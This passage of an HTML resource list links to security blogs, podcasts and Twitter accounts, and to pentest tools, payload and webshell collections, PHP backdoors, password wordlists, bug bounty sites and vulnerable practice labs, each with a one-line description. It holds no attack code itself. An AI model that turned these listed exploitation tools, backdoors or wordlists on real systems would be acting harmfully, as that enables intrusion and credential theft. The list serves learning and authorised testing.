id=blogspodcastsvideos-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Blogs/Podcasts/Videos <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#sysopsdevops-1 id=sysopsdevops-1>SysOps/DevOps</a></h5><p><a href="https://www.youtube.com/watch?v=nAFpkV5-vuI"><b>Varnish for PHP developers</b></a> - very interesting presentation of Varnish by Mattias Geniar.<br><a href="https://www.youtube.com/watch?v=CZ3wIuvmHeM"><b>A Netflix Guide to Microservices</b></a> - Josh Evans talks about the chaotic and vibrant world of microservices at Netflix.<br><h5><a class=header href=#developers-1 id=developers-1>Developers</a></h5><p><a href="https://www.youtube.com/watch?v=yOyaJXpAYZQ"><b>Comparing C to machine language</b></a> - compare a simple C program with the compiled machine code of that program.<br><h5><a class=header href=#geeky-persons id=geeky-persons>Geeky Persons</a></h5><p><a href=http://www.brendangregg.com/><b>Brendan Gregg's Blog</b></a> - is an industry expert in computing performance and cloud computing.<br><a href=https://gynvael.coldwind.pl/><b>Gynvael "GynDream" Coldwind</b></a> - is a IT security engineer at Google.<br><a href=http://lcamtuf.coredump.cx/><b>Michał "lcamtuf" Zalewski</b></a> - white hat hacker, computer security expert.<br><a href=https://ma.ttias.be/><b>Mattias Geniar</b></a> - developer, sysadmin, blogger, podcaster and public speaker.<br><a href=https://nickcraver.com/><b>Nick Craver</b></a> - software developer and systems administrator for Stack Exchange.<br><a href=https://scotthelme.co.uk/><b>Scott Helme</b></a> - security researcher, international speaker and founder of securityheaders.com and report-uri.com.<br><a href=https://krebsonsecurity.com/><b>Brian Krebs</b></a> - The Washington Post and now an Independent investigative journalist.<br><a href=https://www.schneier.com/><b>Bruce Schneier</b></a> - is an internationally renowned security technologist, called a "security guru".<br><a href=https://chrissymorgan.co.uk/><b>Chrissy Morgan</b></a> - advocate of practical learning, Chrissy also takes part in bug bounty programs.<br><a href=https://blog.zsec.uk/><b>Andy Gill</b></a> - is a hacker at heart who works as a senior penetration tester.<br><a href=https://danielmiessler.com/><b>Daniel Miessler</b></a> - cybersecurity expert and writer.<br><a href=https://samy.pl/><b>Samy Kamkar</b></a> - is an American privacy and security researcher, computer hacker.<br><a href=https://www.j4vv4d.com/><b>Javvad Malik</b></a> - is a security advocate at AlienVault, a blogger event speaker and industry commentator.<br><a href=https://www.grahamcluley.com/><b>Graham Cluley</b></a> - public speaker and independent computer security analyst.<br><a href=https://security.szurek.pl/><b>Kacper Szurek</b></a> - detection engineer at ESET.<br><a href=https://www.troyhunt.com/><b>Troy Hunt</b></a> - web security expert known for public education and outreach on security topics.<br><a href=https://raymii.org/s/index.html><b>raymii.org</b></a> - sysadmin specializing in building high availability cloud environments.<br><a href=https://robert.penz.name/><b>Robert Penz</b></a> - IT security expert.<br><h5><a class=header href=#geeky-blogs id=geeky-blogs>Geeky Blogs</a></h5><p><a href=https://linux-audit.com/><b>Linux Audit</b></a> - the Linux security blog about auditing, hardening and compliance by Michael Boelen.<br><a href=https://linuxsecurity.expert/><b>Linux Security Expert</b></a> - trainings, howtos, checklists, security tools and more.<br><a href=http://www.grymoire.com/><b>The Grymoire</b></a> - collection of useful incantations for wizards, be you computer wizards, magicians, or whatever.<br><a href=https://portswigger.net/blog><b>PortSwigger Web Security Blog</b></a> - about web app security vulns and top tips from our team of web security.<br><a href=https://www.secjuice.com><b>Secjuice</b></a> - is the only non-profit, independent and volunteer led publication in the information security space.<br><a href=https://duo.com/decipher><b>Decipher</b></a> - security news that informs and inspires.<br><h5><a class=header href=#geeky-vendor-blogs id=geeky-vendor-blogs>Geeky Vendor Blogs</a></h5><p><a href=https://www.tenable.com/podcast><b>Tenable Podcast</b></a> - conversations and interviews related to Cyber Exposure, and more.<br><a href=https://nakedsecurity.sophos.com/><b>Sophos</b></a> - threat news room, giving you news, opinion, advice and research on computer security issues.<br><a href=https://www.tripwire.com/state-of-security/><b>Tripwire State of Security</b></a> - blog featuring the latest news, trends and insights on current information security issues.<br><a href=https://blog.malwarebytes.com/><b>Malwarebytes Labs Blog</b></a> - security blog aims to provide insider news about cybersecurity.<br><a href=https://www.trustedsec.com/category/articles/><b>TrustedSec</b></a> - latest news, and trends about cybersecurity.<br><a href=https://www.alienvault.com/blogs><b>AT&T Cybersecurity blog</b></a> - news on emerging threats and practical advice to simplify threat detection.<br><a href=https://thycotic.com/company/blog/><b>Thycotic</b></a> - where CISOs and IT Admins come to learn about industry trends, IT security, data breaches, and more.<br><h5><a class=header href=#geeky-cybersecurity-podcasts id=geeky-cybersecurity-podcasts>Geeky Cybersecurity Podcasts</a></h5><p><a href=https://risky.biz/netcasts/risky-business/><b>Risky Business</b></a> - is a weekly information security podcast featuring news and in-depth interviews.<br><a href=https://www.vice.com/en_us/topic/cyber><b>Cyber, by Motherboard</b></a> - stories, and focus on the ideas about cybersecurity.<br><a href=https://www.tenable.com/podcast><b>Tenable Podcast</b></a> - conversations and interviews related to Cyber Exposure, and more.<br><a href=https://podcasts.apple.com/gb/podcast/cybercrime-investigations/id1428801405><b>Cybercrime Investigations</b></a> - podcast by Geoff White about cybercrimes.<br><a href=https://themanyhats.club/tag/episodes/><b>The many hats club</b></a> - featuring stories from a wide range of Infosec people (Whitehat, Greyhat and Blackhat).<br><a href=https://darknetdiaries.com/><b>Darknet Diaries</b></a> - true stories from the dark side of the Internet.<br><a href="https://www.youtube.com/playlist?list=PL423I_gHbWUXah3dmt_q_XNp0NlGAKjis"><b>OSINTCurious Webcasts</b></a> - is the investigative curiosity that helps people be successful in OSINT.<br><a href=https://www.youtube.com/user/SecurityWeeklyTV><b>Security Weekly</b></a> - the latest information security and hacking news.<br><h5><a class=header href=#geeky-cybersecurity-video-blogs id=geeky-cybersecurity-video-blogs>Geeky Cybersecurity Video Blogs</a></h5><p><a href=https://www.youtube.com/channel/UCzvJStjySZVvOBsPl-Vgj0g><b>rev3rse security</b></a> - offensive, binary exploitation, web application security, vulnerability, hardening, red team, blue team.<br><a href=https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w><b>LiveOverflow</b></a> - a lot more advanced topics than what is typically offered in paid online courses - but for free.<br><a href=https://www.youtube.com/infoseccynic><b>J4vv4D</b></a> - the important information regarding our internet security.<br><a href=https://cybertalks.co.uk/><b>CyberTalks</b></a> - talks, interviews, and article about cybersecurity.<br><h5><a class=header href=#best-personal-twitter-accounts id=best-personal-twitter-accounts>Best Personal Twitter Accounts</a></h5><p><a href=https://twitter.com/blackroomsec><b>@blackroomsec</b></a> - a white-hat hacker/pentester. Intergalactic Minesweeper Champion 1990.<br><a href=https://twitter.com/MarcoCiappelli><b>@MarcoCiappelli</b></a> - Co-Founder @ITSPmagazine, at the intersection of IT security and society.<br><a href=https://twitter.com/binitamshah><b>@binitamshah</b></a> - Linux Evangelist. Malwares. Kernel Dev. Security Enthusiast.<br><a href=https://twitter.com/joe_carson><b>@joe_carson</b></a> - an InfoSec Professional and Tech Geek.<br><a href=https://twitter.com/mikko><b>@mikko</b></a> - CRO at F-Secure, Reverse Engineer, TED Speaker, Supervillain.<br><a href=https://twitter.com/esrtweet><b>@esrtweet</b></a> - often referred to as ESR, is an American software developer, and open-source software advocate.<br><a href=https://twitter.com/gynvael><b>@gynvael</b></a> - security researcher/programmer, @DragonSectorCTF founder/player, technical streamer.<br><a href=https://twitter.com/x0rz><b>@x0rz</b></a> - Security Researcher & Cyber Observer.<br><a href=https://twitter.com/hasherezade><b>@hasherezade</b></a> - programmer, malware analyst. Author of PEbear, PEsieve, libPeConv.<br><a href=https://twitter.com/TinkerSec><b>@TinkerSec</b></a> - tinkerer, cypherpunk, hacker.<br><a href=https://twitter.com/alisaesage><b>@alisaesage</b></a> - independent hacker and researcher.<br><a href=https://twitter.com/SwiftOnSecurity><b>@SwiftOnSecurity</b></a> - systems security, industrial safety, sysadmin, author of decentsecurity.com.<br><a href=https://twitter.com/dakami><b>@dakami</b></a> - chief scientist at White Ops, is one of just seven people with the authority to restore the DNS root keys.<br><a href=https://twitter.com/samykamkar><b>@samykamkar</b></a> - is a famous "grey hat" hacker, security researcher, creator of the MySpace "Samy" worm.<br><a href=https://twitter.com/securityweekly><b>@securityweekly</b></a> - founder & CTO of Security Weekly podcast network.<br><a href=https://twitter.com/jack_daniel><b>@jack_daniel</b></a> - @SecurityBSides co-founder.<br><a href=https://twitter.com/thegrugq><b>@thegrugq</b></a> - Security Researcher.<br><a href=https://twitter.com/matthew_d_green><b>@matthew_d_green</b></a> - a cryptographer and professor at Johns Hopkins University.<br><h5><a class=header href=#best-commercial-twitter-accounts id=best-commercial-twitter-accounts>Best Commercial Twitter Accounts</a></h5><p><a href=https://twitter.com/haveibeenpwned><b>@haveibeenpwned</b></a> - check if you have an account that has been compromised in a data breach.<br><a href=https://twitter.com/bugcrowd><b>@bugcrowd</b></a> - trusted by more of the Fortune 500 than any other crowdsourced security platform.<br><a href=https://twitter.com/Malwarebytes><b>@Malwarebytes</b></a> - most trusted security company. Unmatched threat visibility.<br><a href=https://twitter.com/sansforensics><b>@sansforensics</b></a> - the world's leading Digital Forensics and Incident Response provider.<br><a href=https://twitter.com/attcyber><b>@attcyber</b></a> - AT&T Cybersecurity’s Edge-to-Edge technologies provide threat intelligence, and more.<br><a href=https://twitter.com/TheManyHatsClub><b>@TheManyHatsClub</b></a> - an information security focused podcast and group of individuals from all walks of life.<br><a href=https://twitter.com/hedgehogsec><b>@hedgehogsec</b></a> - Hedgehog Cyber. Gibraltar and Manchester's top boutique information security firm.<br><a href=https://twitter.com/NCSC><b>@NCSC</b></a> - the National Cyber Security Centre. Helping to make the UK the safest place to live and work online.<br><a href=https://twitter.com/Synacktiv><b>@Synacktiv</b></a> - IT security experts.<br><h5><a class=header href=#a-piece-of-history id=a-piece-of-history>A piece of history</a></h5><p><a href=http://ftp.arl.army.mil/~mike/howto/><b>How to Do Things at ARL</b></a> - how to configure modems, scan images, record CD-ROMs, and other useful techniques.<b>*</b><br><h5><a class=header href=#other-4 id=other-4>Other</a></h5><p><a href="https://www.youtube.com/watch?v=3QnD2c4Xovk"><b>Diffie-Hellman Key Exchange (short version)</b></a> - how Diffie-Hellman Key Exchange worked.<br><h4><a class=header href=#hackingpenetration-testing-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=hackingpenetration-testing-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Hacking/Penetration Testing <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#pentesters-arsenal-tools id=pentesters-arsenal-tools>Pentesters arsenal tools</a></h5><p><a href=http://www.syhunt.com/sandcat/><b>Sandcat Browser</b></a> - a penetration-oriented browser with plenty of advanced functionality already built in.<br><a href=https://www.metasploit.com/><b>Metasploit</b></a> - tool and framework for pentesting system, web and many more, contains a lot a ready to use exploit.<br><a href=https://portswigger.net/burp><b>Burp Suite</b></a> - tool for testing web application security, intercepting proxy to replay, inject, scan and fuzz HTTP requests.<br><a href=https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project><b>OWASP Zed Attack Proxy</b></a> - intercepting proxy to replay, inject, scan and fuzz HTTP requests.<br><a href=http://w3af.org/><b>w3af</b></a> - is a Web Application Attack and Audit Framework.<br><a href=https://mitmproxy.org/><b>mitmproxy</b></a> - an interactive TLS-capable intercepting HTTP proxy for penetration testers and software developers.<br><a href=https://cirt.net/Nikto2><b>Nikto2</b></a> - web server scanner which performs comprehensive tests against web servers for multiple items.<br><a href=http://sqlmap.org/><b>sqlmap</b></a> - tool that automates the process of detecting and exploiting SQL injection flaws.<br><a href=https://github.com/lanmaster53/recon-ng><b>Recon-ng</b></a> - is a full-featured Web Reconnaissance framework written in Python.<br><a href=https://www.faradaysec.com/><b>Faraday</b></a> - an Integrated Multiuser Pentest Environment.<br><a href=https://github.com/s0md3v/Photon><b>Photon</b></a> - incredibly fast crawler designed for OSINT.<br><a href=https://github.com/s0md3v/XSStrike><b>XSStrike</b></a> - most advanced XSS detection suite.<br><a href=https://github.com/1N3/Sn1per><b>Sn1per</b></a> - automated pentest framework for offensive security experts.<br><a href=https://github.com/future-architect/vuls><b>vuls</b></a> - is an agent-less vulnerability scanner for Linux, FreeBSD, and other.<br><a href=https://github.com/michenriksen/aquatone><b>aquatone</b></a> - a tool for domain flyovers.<br><a href=https://github.com/GitHackTools/BillCipher><b>BillCipher</b></a> - information gathering tool for a website or IP address.<br><a href=https://github.com/Ekultek/WhatWaf><b>WhatWaf</b></a> - detect and bypass web application firewalls and protection systems.<br><a href=https://github.com/s0md3v/Corsy><b>Corsy</b></a> - CORS misconfiguration scanner.<br><a href=https://github.com/evyatarmeged/Raccoon><b>Raccoon</b></a> - is a high performance offensive security tool for reconnaissance and vulnerability scanning.<br><a href=https://github.com/Nekmo/dirhunt><b>dirhunt</b></a> - find web directories without bruteforce.<br><a href=https://www.openwall.com/john/><b>John The Ripper</b></a> - is a fast password cracker, currently available for many flavors of Unix, Windows, and other.<br><a href=https://hashcat.net/hashcat/><b>hashcat</b></a> - world's fastest and most advanced password recovery utility.<br><a href=http://lcamtuf.coredump.cx/p0f3/><b>p0f</b></a> - is a tool to identify the players behind any incidental TCP/IP communications.<br><a href=https://github.com/mozilla/ssh_scan><b>ssh_scan</b></a> - a prototype SSH configuration and policy scanner.<br><a href=https://github.com/woj-ciech/LeakLooker><b>LeakLooker</b></a> - find open databases - powered by Binaryedge.io<br><a href=https://github.com/offensive-security/exploitdb><b>exploitdb</b></a> - searchable archive from The Exploit Database.<br><a href=https://github.com/vulnersCom/getsploit><b>getsploit</b></a> - is a command line utility for searching and downloading exploits.<br><a href=https://github.com/zardus/ctf-tools><b>ctf-tools</b></a> - some setup scripts for security research tools.<br><a href=https://github.com/Gallopsled/pwntools><b>pwntools</b></a> - CTF framework and exploit development library.<br><a href=https://github.com/bl4de/security-tools><b>security-tools</b></a> - collection of small security tools created mostly in Python. CTFs, pentests and so on.<br><a href=https://github.com/leonteale/pentestpackage><b>pentestpackage</b></a> - is a package of Pentest scripts.<br><a href=https://github.com/dloss/python-pentest-tools><b>python-pentest-tools</b></a> - python tools for penetration testers.<br><a href=https://github.com/fuzzdb-project/fuzzdb><b>fuzzdb</b></a> - dictionary of attack patterns and primitives for black-box application fault injection and resource discovery.<br><a href=https://github.com/google/syzkaller><b>syzkaller</b></a> - is an unsupervised, coverage-guided kernel fuzzer.<br><a href=https://github.com/pwndbg/pwndbg><b>pwndbg</b></a> - exploit development and reverse engineering with GDB made easy.<br><a href=https://github.com/longld/peda><b>GDB PEDA</b></a> - Python Exploit Development Assistance for GDB.<br><a href=https://www.hex-rays.com/products/ida/index.shtml><b>IDA</b></a> - multi-processor disassembler and debugger useful for reverse engineering malware.<br><a href=https://github.com/radare/radare2><b>radare2</b></a> - framework for reverse-engineering and analyzing binaries.<br><a href=https://github.com/threat9/routersploit><b>routersploit</b></a> - exploitation framework for embedded devices.<br><a href=https://github.com/NationalSecurityAgency/ghidra><b>Ghidra</b></a> - is a software reverse engineering (SRE) framework.<br><a href=https://github.com/salesforce/vulnreport><b>Vulnreport</b></a> - open-source pentesting management and automation platform by Salesforce Product Security.<br><a href=https://github.com/sc0tfree/mentalist><b>Mentalist</b></a> - is a graphical tool for custom wordlist generation.<br><a href=https://github.com/archerysec/archerysec><b>archerysec</b></a> - vulnerability assessment and management helps to perform scans and manage vulnerabilities.<br><a href=https://github.com/j3ssie/Osmedeus><b>Osmedeus</b></a> - fully automated offensive security tool for reconnaissance and vulnerability scanning.<br><a href=https://github.com/beefproject/beef><b>beef</b></a> - the browser exploitation framework project.<br><a href=https://github.com/NullArray/AutoSploit><b>AutoSploit</b></a> - automated mass exploiter.<br><a href=https://github.com/TH3xACE/SUDO_KILLER><b>SUDO_KILLER</b></a> - is a tool to identify and exploit sudo rules' misconfigurations and vulnerabilities.<br><a href=https://github.com/VirusTotal/yara><b>yara</b></a> - the pattern matching swiss knife.<br><a href=https://github.com/gentilkiwi/mimikatz><b>mimikatz</b></a> - a little tool to play with Windows security.<br><h5><a class=header href=#pentests-bookmarks-collection id=pentests-bookmarks-collection>Pentests bookmarks collection</a></h5><p><a href=http://www.pentest-standard.org/index.php/Main_Page><b>PTES</b></a> - the penetration testing execution standard.<br><a href=https://www.amanhardikar.com/mindmaps/Practice.html><b>Pentests MindMap</b></a> - amazing mind map with vulnerable apps and systems.<br><a href=https://www.amanhardikar.com/mindmaps/webapptest.html><b>WebApps Security Tests MindMap</b></a> - incredible mind map for WebApps security tests.<br><a href=https://brutelogic.com.br/blog/><b>Brute XSS</b></a> - master the art of Cross Site Scripting.<br><a href=https://portswigger.net/web-security/cross-site-scripting/cheat-sheet><b>XSS cheat sheet</b></a> - contains many vectors that can help you bypass WAFs and filters.<br><a href=https://jivoi.github.io/2015/07/03/offensive-security-bookmarks/><b>Offensive Security Bookmarks</b></a> - security bookmarks collection, all that things I need to pass OSCP.<br><a href=https://github.com/coreb1t/awesome-pentest-cheat-sheets><b>Awesome Pentest Cheat Sheets</b></a> - collection of the cheat sheets useful for pentesting.<br><a href=https://github.com/Hack-with-Github/Awesome-Hacking><b>Awesome Hacking by HackWithGithub</b></a> - awesome lists for hackers, pentesters and security researchers.<br><a href=https://github.com/carpedm20/awesome-hacking><b>Awesome Hacking by carpedm20</b></a> - a curated list of awesome hacking tutorials, tools and resources.<br><a href=https://github.com/vitalysim/Awesome-Hacking-Resources><b>Awesome Hacking Resources</b></a> - collection of hacking/penetration testing resources to make you better.<br><a href=https://github.com/enaqx/awesome-pentest><b>Awesome Pentest</b></a> - collection of awesome penetration testing resources, tools and other shiny things.<br><a href=https://github.com/m4ll0k/Awesome-Hacking-Tools><b>Awesome-Hacking-Tools</b></a> - is a curated list of awesome Hacking Tools.<br><a href=https://github.com/ksanchezcld/Hacking_Cheat_Sheet><b>Hacking Cheat Sheet</b></a> - author hacking and pentesting notes.<br><a href=https://github.com/toolswatch/blackhat-arsenal-tools><b>blackhat-arsenal-tools</b></a> - official Black Hat arsenal security tools repository.<br><a href=https://www.peerlyst.com/posts/the-complete-list-of-infosec-related-cheat-sheets-claus-cramon><b>Penetration Testing and WebApp Cheat Sheets</b></a> - the complete list of Infosec related cheat sheets.<br><a href=https://github.com/The-Art-of-Hacking/h4cker><b>Cyber Security Resources</b></a> - includes thousands of cybersecurity-related references and resources.<br><a href=https://github.com/jhaddix/pentest-bookmarks><b>Pentest Bookmarks</b></a> - there are a LOT of pentesting blogs.<br><a href=https://github.com/OlivierLaflamme/Cheatsheet-God><b>Cheatsheet-God</b></a> - Penetration Testing Reference Bank - OSCP/PTP & PTX Cheatsheet.<br><a href=https://github.com/Cyb3rWard0g/ThreatHunter-Playbook><b>ThreatHunter-Playbook</b></a> - to aid the development of techniques and hypothesis for hunting campaigns.<br><a href=https://github.com/swisskyrepo/PayloadsAllTheThings><b>PayloadsAllTheThings</b></a> - a list of useful payloads and bypass for Web Application Security and Pentest/CTF.<br><a href=https://github.com/foospidy/payloads><b>payloads</b></a> - git all the Payloads! A collection of web attack payloads.<br><a href=https://github.com/s0md3v/AwesomeXSS><b>AwesomeXSS</b></a> - is a collection of Awesome XSS resources.<br><a href=https://github.com/JohnTroony/php-webshells><b>php-webshells</b></a> - common php webshells.<br><a href=https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/><b>Pentesting Tools Cheat Sheet</b></a> - a quick reference high level overview for typical penetration testing engagements.<br><a href=https://cheatsheetseries.owasp.org/><b>OWASP Cheat Sheet Series</b></a> - is a collection of high value information on specific application security topics.<br><a href=https://jeremylong.github.io/DependencyCheck/index.html><b>OWASP dependency-check</b></a> - is an open source solution the OWASP Top 10 2013 entry.<br><a href=https://www.owasp.org/index.php/OWASP_Proactive_Controls><b>OWASP ProActive Controls</b></a> - OWASP Top 10 Proactive Controls 2018.<br><a href=https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE><b>PENTESTING-BIBLE</b></a> - hacking & penetration testing & red team & cyber security & computer science resources.<br><a href=https://github.com/nixawk/pentest-wiki><b>pentest-wiki</b></a> - is a free online security knowledge library for pentesters/researchers.<br><a href=https://media.defcon.org/><b>DEF CON Media Server</b></a> - great stuff from DEFCON.<br><a href=https://github.com/rshipp/awesome-malware-analysis><b>Awesome Malware Analysis</b></a> - a curated list of awesome malware analysis tools and resources.<br><a href=https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/><b>SQL Injection Cheat Sheet</b></a> - detailed technical information about the many different variants of the SQL Injection.<br><a href=http://kb.entersoft.co.in/><b>Entersoft Knowledge Base</b></a> - great and detailed reference about vulnerabilities.<br><a href=http://html5sec.org/><b>HTML5 Security Cheatsheet</b></a> - a collection of HTML5 related XSS attack vectors.<br><a href=http://evuln.com/tools/xss-encoder/><b>XSS String Encoder</b></a> - for generating XSS code to check your input validation filters against XSS.<br><a href=https://gtfobins.github.io/><b>GTFOBins</b></a> - list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.<br><a href=https://guif.re/><b>Guifre Ruiz Notes</b></a> - collection of security, system, network and pentest cheatsheets.<br><a href=http://blog.safebuff.com/2016/07/03/SSRF-Tips/index.html><b>SSRF Tips</b></a> - a collection of SSRF Tips.<br><a href=http://shell-storm.org/repo/CTF/><b>shell-storm repo CTF</b></a> - great archive of CTFs.<br><a href=https://github.com/bl4de/ctf><b>ctf</b></a> - CTF (Capture The Flag) writeups, code snippets, notes, scripts.<br><a href=https://github.com/orangetw/My-CTF-Web-Challenges><b>My-CTF-Web-Challenges</b></a> - collection of CTF Web challenges.<br><a href=https://github.com/OWASP/owasp-mstg><b>MSTG</b></a> - The Mobile Security Testing Guide (MSTG) is a comprehensive manual for mobile app security testing.<br><a href=https://github.com/sdcampbell/Internal-Pentest-Playbook><b>Internal-Pentest-Playbook</b></a> - notes on the most common things for an Internal Network Penetration Test.<br><a href=https://github.com/streaak/keyhacks><b>KeyHacks</b></a> - shows quick ways in which API keys leaked by a bug bounty program can be checked.<br><a href=https://github.com/securitum/research><b>securitum/research</b></a> - various Proof of Concepts of security research performed by Securitum.<br><a href=https://github.com/juliocesarfort/public-pentesting-reports><b>public-pentesting-reports</b></a> - is a list of public penetration test reports released by several consulting security groups.<br><a href=https://hackso.me/><b>hackso.me</b></a> - a great journey into security.<br><h5><a class=header href=#backdoorsexploits id=backdoorsexploits>Backdoors/exploits</a></h5><p><a href=https://github.com/bartblaze/PHP-backdoors><b>PHP-backdoors</b></a> - a collection of PHP backdoors. For educational or testing purposes only.<br><h5><a class=header href=#wordlists-and-weak-passwords id=wordlists-and-weak-passwords>Wordlists and Weak passwords</a></h5><p><a href=https://weakpass.com/><b>Weakpass</b></a> - for any kind of bruteforce find wordlists or unleash the power of them all at once!<br><a href=https://hashes.org/><b>Hashes.org</b></a> - is a free online hash resolving service incorporating many unparalleled techniques.<br><a href=https://github.com/danielmiessler/SecLists><b>SecLists</b></a> - collection of multiple types of lists used during security assessments, collected in one place.<br><a href=https://github.com/berzerk0/Probable-Wordlists><b>Probable-Wordlists</b></a> - sorted by probability originally created for password generation and testing.<br><a href="https://wiki.skullsecurity.org/index.php?title=Passwords"><b>skullsecurity passwords</b></a> - password dictionaries and leaked passwords repository.<br><a href=https://bezpieka.org/polski-slownik-premium-polish-wordlist><b>Polish PREMIUM Dictionary</b></a> - official dictionary created by the team on the forum bezpieka.org.<b>*</b> <sup><a href=https://sourceforge.net/projects/kali-linux/files/Wordlist/>1</sup><br><a href=https://github.com/insidetrust/statistically-likely-usernames><b>statistically-likely-usernames</b></a> - wordlists for creating statistically likely username lists for use in password attacks.<br><h5><a class=header href=#bounty-platforms id=bounty-platforms>Bounty platforms</a></h5><p><a href=https://www.yeswehack.com/><b>YesWeHack</b></a> - bug bounty platform with infosec jobs.<br><a href=https://www.openbugbounty.org/><b>Openbugbounty</b></a> - allows any security researcher reporting a vulnerability on any website.<br><a href=https://www.hackerone.com/><b>hackerone</b></a> - global hacker community to surface the most relevant security issues.<br><a href=https://www.bugcrowd.com/><b>bugcrowd</b></a> - crowdsourced cybersecurity for the enterprise.<br><a href=https://crowdshield.com/><b>Crowdshield</b></a> - crowdsourced security & bug bounty management.<br><a href=https://www.synack.com/><b>Synack</b></a> - crowdsourced security & bug bounty programs, crowd security intelligence platform and more.<br><a href=https://hacktrophy.com/en/><b>Hacktrophy</b></a> - bug bounty platform.<br><h5><a class=header href=#web-training-apps-local-installation id=web-training-apps-local-installation>Web Training Apps (local installation)</a></h5><p><a href=https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project><b>OWASP-VWAD</b></a> - comprehensive and well maintained registry of all known vulnerable web applications.<br><a href=http://www.dvwa.co.uk/><b>DVWA</b></a> - PHP/MySQL web application that is damn vulnerable.<br><a href=https://metasploit.help.rapid7.com/docs/metasploitable-2><b>metasploitable2</b></a> - vulnerable web application amongst security researchers.<br><a href=https://github.com/rapid7/metasploitable3><b>metasploitable3</b></a> - is a VM that is built from the ground up with a large amount of security vulnerabilities.<br><a href=https://github.com/stamparm/DSVW><b>DSVW</b></a> - is a deliberately vulnerable web application written in under 100 lines of code.<br><a href=https://sourceforge.net/projects/mutillidae/><b>OWASP Mutillidae II</b></a> - free, open source, deliberately vulnerable web-application.<br><a href=https://www.owasp.org/index.php/OWASP_Juice_Shop_Project><b>OWASP Juice Shop Project</b></a> - the most bug-free vulnerable application in existence.<br><a href=https://www.owasp.org/index.php/Projects/OWASP_Node_js_Goat_Project><b>OWASP Node js Goat Project</b></a> - OWASP Top 10 security risks apply to web applications developed using Node.js.<br><a href=https://github.com/iteratec/juicy-ctf><b>juicy-ctf</b></a> - run Capture the Flags and Security Trainings with OWASP Juice Shop.<br><a href=https://github.com/OWASP/SecurityShepherd><b>SecurityShepherd</b></a> - web and mobile application security training platform.<br><a href=https://github.com/opendns/Security_Ninjas_AppSec_Training><b>Security Ninjas</b></a> - open source application security training program.<br><a href=https://github.com/rapid7/hackazon><b>hackazon</b></a> - a modern vulnerable web app.<br><a href=https://github.com/appsecco/dvna><b>dvna</b></a> - damn vulnerable NodeJS application.<br><a href=https://github.com/DefectDojo/django-DefectDojo><b>django-DefectDojo</b></a> - is an open-source application vulnerability correlation and security orchestration tool.<br><a href=https://google-gruyere.appspot.com/><b>Google Gruyere</b></a> - web application exploits and defenses.<br><a href=https://github.com/amolnaik4/bodhi><b>Bodhi</b></a> - is a playground focused on learning the exploitation of client-side web vulnerabilities.<br><a href=https://websploit.h4cker.org/><b>Websploit</b></a> - single vm lab with the purpose of combining several vulnerable appliations in one environment.<br><a href=https://github.com/vulhub/vulhub><b>vulhub</b></a> - pre-built Vulnerable Environments based on docker-compose.<br><a href=https://rhinosecuritylabs.com/aws/introducing-cloudgoat-2/><b>CloudGoat 2</b></a> - the new & improved "Vulnerable by Design"
AWS deployment tool.<br><a href=https://github.com/globocom/secDevLabs><b>secDevLabs</b></a> - is a laboratory for learning secure web development in a practical manner.<br><a href=https://github.com/incredibleindishell/CORS-vulnerable-Lab><b>CORS-vulnerable-Lab</b></a> - sample vulnerable code and its exploit code.<br><a href=https://github.com/moloch--/RootTheBox><b>RootTheBox</b></a> - a Game of Hackers (CTF Scoreboard & Game Manager).<br><h5><a class=header href=#labs-ethical-hacking-platformstrainingsctfs id=labs-ethical-hacking-platformstrainingsctfs>Labs (ethical hacking platforms/trainings/CTFs)</a></h5><p><a href=https://www.offensive-security.com/><b>Offensive Security</b></a> - true performance-based penetration testing training for over a decade.<br><a href=https://www.hackthebox.eu/><b>Hack The Box</b></a> - online platform allowing you to test your penetration testing skills.<br><a href=https://www.hacking-lab.com/index.html><b>Hacking-Lab</b></a> - online ethical hacking, computer network and security challenge platform.<br><a href=http://pwnable.kr/index.php><b>pwnable.kr</b></a> - non-commercial wargame site which provides various pwn challenges regarding system exploitation.<br><a href=https://pwnable.tw/><b>Pwnable.tw</b></a> - is a wargame site for hackers to test and expand their binary exploiting skills.<br><a href=https://picoctf.com/><b>picoCTF</b></a> - is a free computer security game targeted at middle and high school students.<br><a href=https://ctflearn.com/><b>CTFlearn</b></a> - is an online platform built to help ethical hackers learn and practice their cybersecurity knowledge and skills.<br><a href=https://ctftime.org/><b>ctftime</b></a> - CTF archive and a place, where you can get some another CTF-related info.<br><a href=https://silesiasecuritylab.com/><b>Silesia Security Lab</b></a> - high quality security testing services.<br><a href=https://practicalpentestlabs.com/><b>Practical Pentest Labs</b></a> - pentest lab, take your Hacking skills to the next level.<br><a href="https://www.root-me.org/?lang=en"><b>Root Me</b></a> - the fast, easy, and affordable way to train your hacking skills.<br><a href=https://rozwal.to/login><b>rozwal.to</b></a> - a great platform to train your pentesting skills.<br><a href=https://tryhackme.com/><b>TryHackMe</b></a> - learning Cyber Security made easy.<br><a href=https://hackxor.net/><b>hackxor</b></a> - is a realistic web application hacking game, designed to help players of all abilities develop their skills.<br><a href=http://hack-yourself-first.com/><b>Hack Yourself First</b></a> - it's full of nasty app sec holes.<br><a href=http://overthewire.org/wargames/><b>OverTheWire</b></a> - can help you to learn and practice security concepts in the form of fun-filled games.<br><a href=https://labs.wizard-security.net/><b>Wizard Labs</b></a> - is an online Penetration Testing Lab.<br><a href=https://pentesterlab.com/><b>PentesterLab</b></a> - provides vulnerable systems that can be used to test and understand vulnerabilities.<br><a href=https://ringzer0ctf.com/><b>RingZer0</b></a> - tons of challenges designed to test and improve your hacking skills.<br><a href=http://www.try2hack.nl/><b>try2hack</b></a> - several security-oriented challenges for your entertainment.<br><a href=https://www.ubeeri.com/preconfig-labs><b>Ubeeri</b></a> - preconfigured lab environments.<br><a href=https://lab.pentestit.ru/><b>Pentestit</b></a> - emulate IT infrastructures of real companies for legal pen testing and improving penetration testing skills.<br><a 